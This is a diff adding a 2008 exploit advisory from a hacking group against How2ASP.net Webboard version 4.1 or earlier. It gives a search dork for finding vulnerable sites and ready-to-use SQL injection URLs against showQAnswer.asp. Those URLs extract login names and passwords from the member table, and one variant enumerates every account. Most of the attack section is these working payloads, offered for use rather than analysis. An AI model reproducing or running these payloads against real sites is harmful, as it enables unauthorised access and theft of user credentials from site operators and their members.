@@ -1,0 +1,53 @@
+==========================================================
+               How2ASP.net Webboard 4.1             
+           Remote SQL Injection Vulnerability             
+==========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 17 May 2008
+SITE   : www.citecclub.org
+
+
+#####################################################
+ APPLICATION : How2ASP.net Webboard   
+ VERSION     : <= 4.1   #
+ VENDOR      : http://howtoasp.net   
+ DOWNLOAD    : http://howtoasp.net/dl/app/wb41/webboard41.zip
+#####################################################
+
+
+DORK: "Powered by How2asp"
+
+---Exploit---
+
+http://[target]/[path]/showQAnswer.asp?qNo=441%20union%20select%201,2,Login,4,5,Password,7,8,9,10,11,12,13,14%20from%20member%00
+
+http://[target]/[path]/showQAnswer.asp?qNo=[SQL Statement]
+
+
+---NOTE/TIP---
+
+You must know what columns number that appear on pages, Insert username or password into columns number
+
+You can enumerate all username and password use -> 
+
+http://[target]/[path]/showQAnswer.asp?qNo=441%20union%20select%201,2,Login,4,5,Password,7,8,9,10,11,12,13,14%20from%20member
+%20where%20Login%20not%20in%20('admin','test',....)%00
+
+##################################################################
+# Greetz: ZeQ3uL,BAD $ectors, Snapter, Conan, Win7dos, JabAv0C   #
+##################################################################
+
+# milw0rm.com [2008-05-17]
